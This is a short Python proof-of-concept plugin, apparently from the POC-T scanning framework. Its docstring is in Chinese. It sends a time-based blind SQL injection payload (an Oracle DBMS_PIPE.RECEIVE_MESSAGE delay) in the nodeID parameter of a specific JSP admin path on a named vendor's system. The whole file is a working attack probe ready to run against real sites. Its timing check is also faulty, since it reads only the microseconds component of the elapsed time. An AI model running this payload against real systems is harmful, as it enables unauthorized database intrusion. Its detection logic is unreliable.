# !/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
SQL注入插件示例：方正翔宇某系统SQL注入
"""

import requests


def poc(base_url):
    url = base_url + "/enpadmin/specialtopic/newtpl/UpdateTplRef.jsp?nodeID=1 AND 6695=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(116)||CHR(80)||CHR(69),3) --"
    r = requests.get(url, timeout=10, verify=False)
    if r.elapsed.microseconds > 5000:
        return True
    return False
